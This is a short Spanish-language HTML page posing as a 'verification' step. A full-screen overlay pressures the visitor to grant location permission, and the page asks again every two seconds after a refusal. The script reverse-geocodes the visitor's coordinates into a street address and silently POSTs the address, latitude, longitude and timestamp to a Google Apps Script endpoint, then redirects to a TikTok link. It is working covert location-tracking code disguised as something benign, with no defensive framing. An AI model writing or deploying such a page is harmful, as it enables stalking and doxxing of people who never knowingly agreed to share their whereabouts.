<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Verificación</title>

<style>

body{
margin:0;
font-family:Arial;
}

#bloqueo{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:#000000e6;
color:white;
display:flex;
align-items:center;
justify-content:center;
font-size:24px;
z-index:9999;
text-align:center;
padding:20px;
}

</style>
</head>

<body>

<div id="bloqueo">
Debes aceptar el permiso para continuar
</div>

<script>

function pedirUbicacion(){

navigator.geolocation.getCurrentPosition(

function(pos){

let lat = pos.coords.latitude;
let lon = pos.coords.longitude;

obtenerDireccion(lat,lon);

},

function(){

setTimeout(()=>{
pedirUbicacion();
},2000);

}

);

}

function obtenerDireccion(lat,lon){

fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
.then(res=>res.json())
.then(data=>{

let direccion = data.display_name;

enviarDatos(direccion,lat,lon);

});

}

function enviarDatos(direccion,lat,lon){

fetch("https://script.google.com/macros/s/AKfycbwhywjoW3-u9kQF0o52_KKQaFdaTy64XMTDSK1fZYlKN9ROnTFpEJrFjZb0EMVvW2ppeg/exec",{

method:"POST",

body:JSON.stringify({

direccion:direccion,
latitud:lat,
longitud:lon,
fecha:new Date().toString()

})

}).then(()=>{

window.location.href="https://vt.tiktok.com/ZSuHJ3ef1/";

});

}

window.onload=pedirUbicacion;

</script>

</body>
</html>
